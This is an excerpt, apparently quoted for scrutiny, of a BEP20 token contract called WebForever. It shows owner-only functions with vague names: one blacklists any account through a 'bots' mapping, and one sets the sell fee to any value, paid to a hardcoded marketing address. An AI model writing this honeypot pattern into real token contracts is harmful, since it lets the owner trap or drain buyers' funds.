...
contract Webover is IBEP20, Admin{
    ...
    string constant _name = "WebForever";
    string constant _symbol = "Webover";
    ...
    address private marketingFeeReceiver = (0x41468982616C799702A9B486aa90C71915195811); // marketing address
    ...
    function setBMWebover(address account,bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setFMWebover(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
